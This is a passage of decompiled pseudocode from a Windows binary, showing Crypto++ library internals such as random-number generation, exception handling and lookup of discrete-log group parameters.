// 140054190: using guessed type char var_88[73];

//----- (00000001400542F0) ----------------------------------------------------
size_t *__fastcall sub_1400542F0(void *Src, void *a2, _QWORD *a3)
{
  _QWORD *v3; // r14
  _BYTE *v4; // rsi
  size_t *v5; // rdi
  size_t v6; // rbx
  signed __int64 v7; // rcx
  unsigned __int64 v8; // rdx
  _BYTE *v9; // rax

  v3 = a3;
  v4 = a2;
  v5 = (size_t *)Src;
  v6 = 0i64;
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *(_BYTE *)a2 )
  {
    v7 = -1i64;
    do
      ++v7;
    while ( *((_BYTE *)a2 + v7) );
  }
  else
  {
    v7 = 0i64;
  }
  v8 = v7 + a3[2];
  if ( v5[3] != v8 && sub_1400049C0(v5, v8, 1) )
  {
    v5[2] = 0i64;
    if ( v5[3] < 0x10 )
      v9 = v5;
    else
      v9 = (_BYTE *)*v5;
    *v9 = 0;
  }
  if ( *v4 )
  {
    v6 = -1i64;
    do
      ++v6;
    while ( v4[v6] );
  }
  sub_140004CA0(v5, v4, v6);
  sub_140004B80(v5, v3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v5;
}

//----- (00000001400543D0) ----------------------------------------------------
_QWORD *__fastcall sub_1400543D0(void *Dst, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // esi
  _QWORD *v4; // rdi
  char v5; // r14
  unsigned int v6; // er15
  unsigned int v7; // edx
  char v8; // al
  size_t *v9; // rbx
  unsigned __int64 v10; // rcx
  void *Dsta; // [rsp+30h] [rbp-50h]
  size_t v13; // [rsp+40h] [rbp-40h]
  unsigned __int64 v14; // [rsp+48h] [rbp-38h]
  void *v15; // [rsp+50h] [rbp-30h]
  unsigned __int64 v16; // [rsp+68h] [rbp-18h]

  v3 = a2;
  v4 = Dst;
  v5 = ~(a3 >> 26) & 0x20 | 0x41;
  v6 = a3 & 0x7FFFFFFF;
  if ( a2 )
  {
    v14 = 15i64;
    v13 = 0i64;
    LOBYTE(Dsta) = 0;
    if ( a2 )
    {
      do
      {
        v7 = v3 % v6;
        v3 /= v6;
        if ( v7 >= 0xA )
          v8 = v5 - 10;
        else
          v8 = 48;
        v9 = sub_14003A8B0((size_t *)&v15, v8 + (unsigned __int8)v7, &Dsta);
        if ( &Dsta != (void **)v9 )
        {
          if ( v14 >= 0x10 )
            operator delete(Dsta);
          v14 = 15i64;
          v13 = 0i64;
          LOBYTE(Dsta) = 0;
          if ( v9[3] >= 0x10 )
          {
            Dsta = (void *)*v9;
            *v9 = 0i64;
          }
          else if ( v9[2] != -1i64 )
          {
            memmove(&Dsta, v9, v9[2] + 1);
          }
          v13 = v9[2];
          v14 = v9[3];
          v9[3] = 15i64;
          v9[2] = 0i64;
          *(_BYTE *)v9 = 0;
        }
        if ( v16 >= 0x10 )
          operator delete(v15);
      }
      while ( v3 );
    }
    v4[3] = 15i64;
    v4[2] = 0i64;
    *(_BYTE *)v4 = 0;
    v10 = v14;
    if ( v14 >= 0x10 )
    {
      *v4 = Dsta;
    }
    else if ( v13 != -1i64 )
    {
      memmove(v4, &Dsta, v13 + 1);
      v10 = v14;
    }
    v4[2] = v13;
    v4[3] = v10;
  }
  else
  {
    *((_QWORD *)Dst + 3) = 15i64;
    *((_QWORD *)Dst + 2) = 0i64;
    *(_BYTE *)Dst = 0;
    sub_140004F20(Dst, &unk_1400AA008, 1ui64);
  }
  return v4;
}

//----- (0000000140054590) ----------------------------------------------------
HCRYPTPROV *__fastcall sub_140054590(HCRYPTPROV *a1)
{
  HCRYPTPROV *v1; // rbx
  char Dst; // [rsp+38h] [rbp-80h]
  __int64 v4; // [rsp+48h] [rbp-70h]
  __int64 v5; // [rsp+50h] [rbp-68h]
  char v6; // [rsp+60h] [rbp-58h]

  v1 = a1;
  if ( !CryptAcquireContextW(a1, 0i64, 0i64, 1u, 0xF0000000) )
  {
    v5 = 15i64;
    v4 = 0i64;
    Dst = 0;
    sub_140004F20(&Dst, byte_1400A3400, 0i64);
    sub_1400546C0(&v6, &Dst);
    CxxThrowException(&v6, &_TI3_AVcls_103_CryptoPP__);
  }
  return v1;
}
// 1400546C0: using guessed type __int64 __fastcall sub_1400546C0(_QWORD, _QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D4370: using guessed type int _TI3_AVcls_103_CryptoPP__;

//----- (0000000140054640) ----------------------------------------------------
std::exception *__fastcall sub_140054640(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = *((_DWORD *)v2 + 6);
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, (_QWORD *)v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140054870) ----------------------------------------------------
_QWORD *__fastcall sub_140054870(_QWORD *a1, char a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  *a1 = &off_1400AB4E8;
  if ( a2 & 1 )
    operator delete(a1);
  return v2;
}
// 1400AB4E8: using guessed type __int64 (__fastcall *off_1400AB4E8)();

//----- (00000001400548A0) ----------------------------------------------------
BOOL __fastcall sub_1400548A0(__int64 a1, BYTE *a2, DWORD a3)
{
  DWORD v3; // edi
  BYTE *v4; // rbx
  HCRYPTPROV *v5; // rax
  BOOL result; // eax
  char v7; // [rsp+20h] [rbp-88h]
  __int64 v8; // [rsp+28h] [rbp-80h]
  char Dst; // [rsp+30h] [rbp-78h]
  __int64 v10; // [rsp+40h] [rbp-68h]
  __int64 v11; // [rsp+48h] [rbp-60h]
  char v12; // [rsp+50h] [rbp-58h]

  v8 = -2i64;
  v3 = a3;
  v4 = a2;
  v5 = (HCRYPTPROV *)sub_140054960(&v7);
  result = CryptGenRandom(*v5, v3, v4);
  if ( !result )
  {
    v11 = 15i64;
    v10 = 0i64;
    Dst = 0;
    sub_140004F20(&Dst, byte_1400A3400, 0i64);
    sub_1400546C0(&v12, &Dst);
    CxxThrowException(&v12, &_TI3_AVcls_103_CryptoPP__);
  }
  return result;
}
// 1400546C0: using guessed type __int64 __fastcall sub_1400546C0(_QWORD, _QWORD);
// 140054960: using guessed type __int64 __fastcall sub_140054960(_QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D4370: using guessed type int _TI3_AVcls_103_CryptoPP__;

//----- (0000000140054A10) ----------------------------------------------------
void __fastcall sub_140054A10(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 v3; // rdi
  size_t v4; // rbx
  BYTE *v5; // rsi
  __int64 (__fastcall **v6)(); // [rsp+50h] [rbp+8h]

  v3 = a1;
  v4 = a3;
  sub_1400255A0(a3);
  if ( v4 )
    v5 = (BYTE *)sub_14003A000(v4);
  else
    v5 = 0i64;
  sub_140036DA0((__int64)&v6, 1);
  v6 = &off_1400AB4E8;
  sub_1400548A0((__int64)&v6, v5, v4);
  (*(void (__fastcall **)(__int64, BYTE *, size_t))(*(_QWORD *)v3 + 24i64))(v3, v5, v4);
  memset(v5, 0, v4);
  free(v5);
}
// 1400AB4E8: using guessed type __int64 (__fastcall *off_1400AB4E8)();

//----- (0000000140054AB0) ----------------------------------------------------
signed __int64 *__fastcall sub_140054AB0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 v4; // rdi
  signed __int64 *v5; // rbx
  void *v6; // rdx
  char v8; // [rsp+20h] [rbp-B8h]
  __int64 v9; // [rsp+30h] [rbp-A8h]
  void *Memory; // [rsp+38h] [rbp-A0h]
  __int64 v11; // [rsp+48h] [rbp-90h]
  char v12; // [rsp+50h] [rbp-88h]
  __int64 v13; // [rsp+60h] [rbp-78h]
  __int64 v14; // [rsp+68h] [rbp-70h]
  __int64 (__fastcall **v15)(void *); // [rsp+70h] [rbp-68h]
  int v16; // [rsp+88h] [rbp-50h]
  char Dst; // [rsp+90h] [rbp-48h]
  __int64 v18; // [rsp+A0h] [rbp-38h]
  __int64 v19; // [rsp+A8h] [rbp-30h]

  v11 = -2i64;
  v3 = a3;
  v4 = a2;
  v5 = (signed __int64 *)a1;
  if ( !*(_BYTE *)(a1 + 16) )
  {
    sub_14003C210(&v8);
    if ( !(*(unsigned __int8 (__fastcall **)(signed __int64, __int64, void *, char *))(*(_QWORD *)v5[1] + 8i64))(
            v5[1],
            v4,
            &CryptoPP::cls_097 `RTTI Type Descriptor',
            &v8) )
    {
      v14 = 15i64;
      v13 = 0i64;
      v12 = 0;
      sub_140004F20(&v12, byte_1400A3400, 0i64);
      std::exception::exception((std::exception *)&v15);
      v15 = &off_1400A8798;
      v16 = 1;
      v19 = 15i64;
      v18 = 0i64;
      Dst = 0;
      sub_140004DF0(&Dst, &v12, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      v15 = &off_1400A8798;
      CxxThrowException(&v15, &_TI3_AVcls_001_CryptoPP__);
    }
    (*(void (__fastcall **)(signed __int64, char *))v3)(
      *(signed int *)(v3 + 8) + 16i64 + *v5 + *(signed int *)(*(signed int *)(v3 + 12) + *(_QWORD *)(*v5 + 16)),
      &v8);
    v6 = Memory;
    memset(Memory, 0, 8 * v9);
    free(v6);
  }
  return v5;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (0000000140054C20) ----------------------------------------------------
signed __int64 *__fastcall sub_140054C20(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // r14
  __int64 v5; // rsi
  __int64 v6; // rdi
  signed __int64 *v7; // rbx
  void *v8; // rdx
  void *v9; // rdx
  char v11; // [rsp+20h] [rbp-99h]
  __int64 v12; // [rsp+30h] [rbp-89h]
  void *Memory; // [rsp+38h] [rbp-81h]
  __int64 v14; // [rsp+48h] [rbp-71h]
  char v15; // [rsp+50h] [rbp-69h]
  __int64 v16; // [rsp+60h] [rbp-59h]
  void *v17; // [rsp+68h] [rbp-51h]
  char v18; // [rsp+78h] [rbp-41h]
  __int64 v19; // [rsp+88h] [rbp-31h]
  __int64 v20; // [rsp+90h] [rbp-29h]
  __int64 (__fastcall **v21)(void *); // [rsp+A0h] [rbp-19h]
  int v22; // [rsp+B8h] [rbp-1h]
  char Dst; // [rsp+C0h] [rbp+7h]
  __int64 v24; // [rsp+D0h] [rbp+17h]
  __int64 v25; // [rsp+D8h] [rbp+1Fh]

  v14 = -2i64;
  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = (signed __int64 *)a1;
  if ( !*(_BYTE *)(a1 + 16) )
  {
    sub_14003C210(&v15);
    if ( !(*(unsigned __int8 (__fastcall **)(signed __int64, __int64, void *, char *))(*(_QWORD *)v7[1] + 8i64))(
            v7[1],
            v6,
            &CryptoPP::cls_097 `RTTI Type Descriptor',
            &v15) )
    {
      v20 = 15i64;
      v19 = 0i64;
      v18 = 0;
      sub_140004F20(&v18, byte_1400A3400, 0i64);
      std::exception::exception((std::exception *)&v21);
      v21 = &off_1400A8798;
      v22 = 1;
      v25 = 15i64;
      v24 = 0i64;
      Dst = 0;
      sub_140004DF0(&Dst, &v18, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      v21 = &off_1400A8798;
      CxxThrowException(&v21, &_TI3_AVcls_001_CryptoPP__);
    }
    sub_14003C210(&v11);
    if ( !(*(unsigned __int8 (__fastcall **)(signed __int64, __int64, void *, char *))(*(_QWORD *)v7[1] + 8i64))(
            v7[1],
            v5,
            &CryptoPP::cls_097 `RTTI Type Descriptor',
            &v11) )
    {
      v20 = 15i64;
      v19 = 0i64;
      v18 = 0;
      sub_140004F20(&v18, byte_1400A3400, 0i64);
      std::exception::exception((std::exception *)&v21);
      v21 = &off_1400A8798;
      v22 = 1;
      v25 = 15i64;
      v24 = 0i64;
      Dst = 0;
      sub_140004DF0(&Dst, &v18, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      v21 = &off_1400A8798;
      CxxThrowException(&v21, &_TI3_AVcls_001_CryptoPP__);
    }
    (*(void (__fastcall **)(signed __int64, char *, char *))v4)(
      *v7 + *(signed int *)(*(signed int *)(v4 + 12) + *(_QWORD *)(*v7 + 16)) + *(signed int *)(v4 + 8) + 16i64,
      &v15,
      &v11);
    v8 = Memory;
    memset(Memory, 0, 8 * v12);
    free(v8);
    v9 = v17;
    memset(v17, 0, 8 * v16);
    free(v9);
  }
  return v7;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (0000000140054E40) ----------------------------------------------------
__int64 __fastcall sub_140054E40(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  char *v4; // rax
  _QWORD *v5; // rax
  _QWORD *v6; // rdx
  unsigned __int8 v7; // bl
  void *v9; // [rsp+28h] [rbp-50h]
  __int64 v10; // [rsp+38h] [rbp-40h]
  unsigned __int64 v11; // [rsp+40h] [rbp-38h]
  void *v12; // [rsp+48h] [rbp-30h]
  __int64 v13; // [rsp+58h] [rbp-20h]
  unsigned __int64 v14; // [rsp+60h] [rbp-18h]

  v2 = a2;
  v3 = a1;
  v11 = 15i64;
  v10 = 0i64;
  LOBYTE(v9) = 0;
  sub_140004F20(&v9, "ThisObject:", 0xBui64);
  v4 = (char *)type_info::_name_internal_method(
                 (type_info *)&CryptoPP::cls_113 `RTTI Type Descriptor',
                 (struct __type_info_node *)&unk_1400DC648);
  v5 = sub_14000DAC0(&v12, &v9, v4);
  v6 = v5;
  if ( v5[3] >= 0x10ui64 )
    v6 = (_QWORD *)*v5;
  v7 = (*(__int64 (__fastcall **)(__int64, _QWORD *, void *, __int64, signed __int64))(*(_QWORD *)v3 + 8i64))(
         v3,
         v6,
         &CryptoPP::cls_113 `RTTI Type Descriptor',
         v2,
         -2i64);
  if ( v14 >= 0x10 )
    operator delete(v12);
  v14 = 15i64;
  v13 = 0i64;
  LOBYTE(v12) = 0;
  if ( v11 >= 0x10 )
    operator delete(v9);
  return v7;
}
// 1400A17B8: using guessed type const char *type_info::_name_internal_method(type_info *__hidden this, struct __type_info_node *);

//----- (0000000140054F40) ----------------------------------------------------
__int64 __fastcall sub_140054F40(__int64 a1, __int64 a2, const char *a3, __int64 a4, _QWORD *a5, __int64 a6)
{
  __int64 v6; // r13
  __int64 v7; // rbx
  __int64 v8; // rbp
  char *v9; // rdi
  _QWORD *v10; // rdi
  char *v11; // rax
  size_t v12; // r8
  _QWORD *v13; // rax
  _QWORD *v14; // rdi
  size_t v15; // r8
  unsigned __int64 v16; // rsi
  unsigned __int64 v17; // rax
  _QWORD *v18; // rax
  bool v19; // cf
  unsigned __int8 *v20; // rdi
  const char *v21; // rax
  unsigned __int8 *v22; // rdx
  signed __int64 v23; // rax
  int v24; // er8
  int v25; // er9

  *(_QWORD *)a1 = a2;
  v6 = a2;
  v7 = a1;
  *(_QWORD *)(a1 + 8) = a3;
  *(_QWORD *)(a1 + 16) = a4;
  *(_QWORD *)(a1 + 24) = a5;
  *(_WORD *)(a1 + 32) = 0;
  v8 = a4;
  v9 = (char *)a3;
  if ( strcmp(a3, "ValueNames") )
    goto LABEL_26;
  *(_WORD *)(v7 + 32) = 257;
  sub_1400293A0(
    v9,
    (__int64)&std::basic_string<char,std::char_traits<char>,std::allocator<char>> `RTTI Type Descriptor',
    v8);
  if ( a6 )
    (*(void (__fastcall **)(__int64, _QWORD, __int64, _QWORD *))(*(_QWORD *)a6 + 8i64))(a6, *(_QWORD *)(v7 + 8), v8, a5);
  if ( (unsigned __int8)type_info::operator!=(
                          &CryptoPP::cls_113 `RTTI Type Descriptor',
                          &CryptoPP::cls_115<CryptoPP::cls_097> `RTTI Type Descriptor') )
    sub_140050AC0(v6 + 40, *(const char **)(v7 + 8), v8, a5);
  v10 = sub_140004CA0(*(void **)(v7 + 24), "ThisPointer:", 0xCui64);
  v11 = (char *)type_info::_name_internal_method(
                  (type_info *)&CryptoPP::cls_113 `RTTI Type Descriptor',
                  (struct __type_info_node *)&unk_1400DC648);
  if ( *v11 )
  {
    v12 = -1i64;
    do
      ++v12;
    while ( v11[v12] );
  }
  else
  {
    v12 = 0i64;
  }
  v13 = sub_140004CA0(v10, v11, v12);
  v14 = v13;
  v15 = v13[2];
  if ( -1i64 - v15 <= 1 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v16 = v15 + 1;
  if ( v15 + 1 > 0xFFFFFFFFFFFFFFFEui64 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v17 = v13[3];
  if ( v17 < v16 )
  {
    sub_140004790(v14, v16, v15);
    if ( !v16 )
      goto LABEL_26;
    goto LABEL_16;
  }
  if ( v16 )
  {
LABEL_16:
    if ( v14[3] < 0x10ui64 )
      v18 = v14;
    else
      v18 = (_QWORD *)*v14;
    *((_BYTE *)v18 + v14[2]) = 59;
    v19 = v14[3] < 0x10ui64;
    v14[2] = v16;
    if ( !v19 )
      v14 = (_QWORD *)*v14;
    *((_BYTE *)v14 + v16) = 0;
    goto LABEL_26;
  }
  v14[2] = 0i64;
  if ( v17 >= 0x10 )
    v14 = (_QWORD *)*v14;
  *(_BYTE *)v14 = 0;
LABEL_26:
  if ( !*(_BYTE *)(v7 + 32) )
  {
    if ( strncmp(*(const char **)(v7 + 8), "ThisPointer:", 0xCui64) )
      goto LABEL_42;
    v20 = *(unsigned __int8 **)(v7 + 8);
    v21 = type_info::_name_internal_method(
            (type_info *)&CryptoPP::cls_113 `RTTI Type Descriptor',
            (struct __type_info_node *)&unk_1400DC648);
    v22 = v20 + 12;
    v23 = v21 - (const char *)(v20 + 12);
    do
    {
      v24 = v22[v23];
      v25 = *v22 - v24;
      if ( *v22 != v24 )
        break;
      ++v22;
    }
    while ( v24 );
    if ( v25 )
    {
LABEL_42:
      if ( !*(_BYTE *)(v7 + 32) )
      {
        if ( a6 )
          *(_BYTE *)(v7 + 32) = (*(__int64 (__fastcall **)(__int64, _QWORD, __int64, _QWORD *))(*(_QWORD *)a6 + 8i64))(
                                  a6,
                                  *(_QWORD *)(v7 + 8),
                                  v8,
                                  a5);
        if ( !*(_BYTE *)(v7 + 32)
          && (unsigned __int8)type_info::operator!=(
                                &CryptoPP::cls_113 `RTTI Type Descriptor',
                                &CryptoPP::cls_115<CryptoPP::cls_097> `RTTI Type Descriptor') )
        {
          *(_BYTE *)(v7 + 32) = sub_140050AC0(v6 + 40, *(const char **)(v7 + 8), v8, a5);
        }
      }
    }
    else
    {
      sub_1400293A0(v20, (__int64)&CryptoPP::cls_113 * `RTTI Type Descriptor', *(_QWORD *)(v7 + 16));
      *a5 = v6;
      *(_BYTE *)(v7 + 32) = 1;
    }
  }
  return v7;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A17B8: using guessed type const char *type_info::_name_internal_method(type_info *__hidden this, struct __type_info_node *);
// 1400A1920: using guessed type __int64 __fastcall type_info::operator!=(_QWORD, _QWORD);
// 1400D8E00: using guessed type void *(__fastcall **std::basic_string<char,std::char_traits<char>,std::allocator<char>> `RTTI Type Descriptor')(type_info *this, unsigned int);
// 1400D92F8: using guessed type void *(__fastcall **CryptoPP::cls_115<CryptoPP::cls_097> `RTTI Type Descriptor')(type_info *this, unsigned int);
// 1400D93B8: using guessed type struct CryptoPP::cls_113 *CryptoPP::cls_113 * `RTTI Type Descriptor';

//----- (00000001400551E0) ----------------------------------------------------
void __fastcall sub_1400551E0(__int64 a1)
{
  __int64 v1; // rbx
  void *v2; // rdx
  void *v3; // rdx
  void *v4; // rdx

  v1 = a1;
  v2 = *(void **)(a1 + 104);
  memset(*(void **)(a1 + 104), 0, 8i64 * *(_QWORD *)(a1 + 96));
  free(v2);
  v3 = *(void **)(v1 + 64);
  memset(*(void **)(v1 + 64), 0, 8i64 * *(_QWORD *)(v1 + 56));
  free(v3);
  v4 = *(void **)(v1 + 24);
  memset(*(void **)(v1 + 24), 0, 8i64 * *(_QWORD *)(v1 + 16));
  free(v4);
}

//----- (0000000140055250) ----------------------------------------------------
__int64 __fastcall sub_140055250(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)a1 + 32i64))();
}

//----- (0000000140055260) ----------------------------------------------------
signed __int64 *__fastcall sub_140055260(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  signed __int64 v3; // rdi
  signed __int64 *v4; // rax
  __m128i v6; // [rsp+20h] [rbp-48h]
  __m128i v7; // [rsp+30h] [rbp-38h]
  __int64 v8; // [rsp+40h] [rbp-28h]
  __int64 v9; // [rsp+48h] [rbp-20h]
  char v10; // [rsp+50h] [rbp-18h]

  v2 = a2;
  v3 = a1 - 80;
  v6.m128i_i64[0] = (__int64)sub_140028F40;
  v6.m128i_i64[1] = 4294967288i64;
  _mm_store_si128(&v6, v6);
  v7.m128i_i64[0] = (__int64)sub_140055258;
  v7.m128i_i64[1] = 4294967288i64;
  v10 = 0;
  _mm_store_si128(&v7, v7);
  v8 = a1 - 80;
  v9 = a2;
  if ( (unsigned __int8)sub_140054E40(a2, a1 - 80) )
  {
    v10 = 1;
  }
  else if ( (unsigned __int8)type_info::operator!=(
                               &CryptoPP::cls_113 `RTTI Type Descriptor',
                               &CryptoPP::cls_113 `RTTI Type Descriptor') )
  {
    sub_140055260(v3 + 80, v2);
  }
  v4 = sub_140054C20((__int64)&v8, (__int64)"Modulus", (__int64)"SubgroupGenerator", (__int64)&v7);
  return sub_140054AB0((__int64)v4, (__int64)"SubgroupOrder", (__int64)&v6);
}
// 140055258: using guessed type __int64 __fastcall sub_140055258();
// 1400A1920: using guessed type __int64 __fastcall type_info::operator!=(_QWORD, _QWORD);

//----- (0000000140055340) ----------------------------------------------------
__int64 __fastcall sub_140055340(_DWORD *a1, __int64 a2)
{
  _DWORD *v2; // rbx
  __int64 v3; // rax
  void *v4; // rax
  void *v5; // rdx
  void *v6; // rdx
  void *v7; // rdx
  void *v8; // rdx
  void *v9; // rdx
  char v11; // [rsp+20h] [rbp-D8h]
  __int64 v12; // [rsp+30h] [rbp-C8h]
  void *v13; // [rsp+38h] [rbp-C0h]
  char v14; // [rsp+48h] [rbp-B0h]
  __int64 v15; // [rsp+58h] [rbp-A0h]
  void *v16; // [rsp+60h] [rbp-98h]
  char v17; // [rsp+70h] [rbp-88h]
  __int64 v18; // [rsp+78h] [rbp-80h]
  void *v19; // [rsp+80h] [rbp-78h]
  __int64 v20; // [rsp+90h] [rbp-68h]
  char v21; // [rsp+98h] [rbp-60h]
  __int64 v22; // [rsp+A8h] [rbp-50h]
  void *Memory; // [rsp+B0h] [rbp-48h]
  char v24; // [rsp+C0h] [rbp-38h]
  __int64 v25; // [rsp+D0h] [rbp-28h]
  void *v26; // [rsp+D8h] [rbp-20h]
  __int64 (__fastcall **v27)(void *); // [rsp+E8h] [rbp-10h]
  __int64 (__fastcall **v28)(); // [rsp+F0h] [rbp-8h]

  v20 = -2i64;
  v2 = a1;
  sub_14005F770((__int64)&v28, a2, 48);
  v27 = &off_1400A9AC0;
  v28 = &off_1400ACF80;
  sub_14003BFA0(&v17, (__int64)&v27);
  sub_14003BFA0(&v11, (__int64)&v27);
  sub_14003C210(&v14);
  if ( sub_1400608C0((__int64)&v27) )
  {
    sub_14003C670((__int64)&v14, (__int64)&v11);
    v3 = sub_1400258A0((__int64)v2, (__int64)&v24, (__int64)&v17);
    v4 = sub_1400247A0(&v21, v3, 2ui64);
    sub_14003C670((__int64)&v11, (__int64)v4);
    v5 = Memory;
    memset(Memory, 0, 8 * v22);
    free(v5);
    v6 = v26;
    memset(v26, 0, 8 * v25);
    free(v6);
  }
  else
  {
    sub_14003E8A0((__int64)&v14, (__int64)&v27);
  }
  sub_140060990((__int64)&v27);
  (*(void (__fastcall **)(_DWORD *, char *, char *))(*(_QWORD *)v2 + 40i64))(v2, &v17, &v14);
  sub_14003C670((__int64)(v2 + 8), (__int64)&v11);
  v2[6] = 0;
  v7 = v16;
  memset(v16, 0, 8 * v15);
  free(v7);
  v8 = v13;
  memset(v13, 0, 8 * v12);
  free(v8);
  v9 = v19;
  memset(v19, 0, 8 * v18);
  free(v9);
  return sub_14005F840(&v27);
}
// 14005F840: using guessed type __int64 __fastcall sub_14005F840(_QWORD);
// 1400A9AC0: using guessed type __int64 (__fastcall *off_1400A9AC0)(void *);
// 1400ACF80: using guessed type __int64 (__fastcall *off_1400ACF80)();

//----- (00000001400554F0) ----------------------------------------------------
void __fastcall sub_1400554F0(_QWORD *a1, __int64 a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 (__fastcall **v5)(void *); // [rsp+30h] [rbp-78h]
  __int64 (__fastcall **v6)(); // [rsp+38h] [rbp-70h]

  v2 = a1;
  sub_14005F7E0((__int64)&v5, a2, 48);
  v5 = &off_1400A9C28;
  v6 = &off_1400ACF98;
  v3 = (*(__int64 (__fastcall **)(_QWORD *))(*v2 + 32i64))(v2);
  (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)(void *)))(*(_QWORD *)v3 + 16i64))(v3, &v5);
  (*(void (__fastcall **)(_QWORD *, __int64 (__fastcall ***)(void *)))(v2[4] + 16i64))(v2 + 4, &v5);
  v4 = (*(__int64 (__cdecl **)(_QWORD *))(v2[1] + 8i64))(v2 + 1);
  (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)(void *)))(*(_QWORD *)v4 + 16i64))(v4, &v5);
  sub_1400609E0((__int64)&v5);
  sub_14005F8B0((__int64)&v5);
}
// 1400A9C28: using guessed type __int64 (__fastcall *off_1400A9C28)(void *);
// 1400ACF98: using guessed type __int64 (__fastcall *off_1400ACF98)();

//----- (00000001400555B0) ----------------------------------------------------
_QWORD *__fastcall sub_1400555B0(__int64 a1, _QWORD *a2, __int64 a3)
{
  __int64 v3; // rbx
  _QWORD *v4; // rsi
  __int64 v5; // rdi
  __int64 v6; // rax
  unsigned int v7; // eax
  _QWORD *v8; // rbx
  __int64 (__fastcall **v10)(void *); // [rsp+40h] [rbp-88h]
  int v11; // [rsp+58h] [rbp-70h]
  char Dst; // [rsp+60h] [rbp-68h]
  __int64 v13; // [rsp+70h] [rbp-58h]
  __int64 v14; // [rsp+78h] [rbp-50h]
  void *Src; // [rsp+80h] [rbp-48h]
  unsigned __int64 v16; // [rsp+98h] [rbp-30h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = (*(__int64 (__cdecl **)(__int64, _QWORD *, __int64))(*(_QWORD *)(a1 - 8) + 32i64))(a1 - 8, a2, a3);
  v7 = sub_1400453C0(v6);
  sub_14003C170(v4, v3, v7, 0);
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, signed __int64, _QWORD *))(*(_QWORD *)v5 + 136i64))(v5, 1i64, v4) )
  {
    v8 = sub_140055A10(&Src);
    std::exception::exception((std::exception *)&v10);
    v10 = &off_1400A8798;
    v11 = 4;
    v14 = 15i64;
    v13 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, v8, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v10 = &off_1400A8798;
    if ( v16 >= 0x10 )
      operator delete(Src);
    v10 = &off_1400A8798;
    CxxThrowException(&v10, &_TI4_AVcls_110_CryptoPP__);
  }
  return v4;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3D40: using guessed type int _TI4_AVcls_110_CryptoPP__;

//----- (00000001400559F0) ----------------------------------------------------
__int64 __fastcall sub_1400559F0(__int64 a1, int a2)
{
  int v2; // ebx
  int v3; // eax

  v2 = a2;
  v3 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 48i64))();
  return 2 * (unsigned int)sub_14005B860(v2 * v3);
}

//----- (0000000140055A10) ----------------------------------------------------
_QWORD *__fastcall sub_140055A10(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DABA4;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DABA4 & 1 )
  {
    v5 = byte_1400DABA0;
  }
  else
  {
    v4 = 69069 * dword_1400DAB98 + 1234567;
    v1 = dword_1400DABA4 | 1;
    dword_1400DAB98 = v4;
    dword_1400DABA4 |= 1u;
    dword_1400DAB90 = HIWORD(dword_1400DAB90) + 36969 * (unsigned __int16)dword_1400DAB90;
    LOBYTE(v4) = (BYTE2(dword_1400DAB9C) + 80 * dword_1400DAB9C) ^ v4;
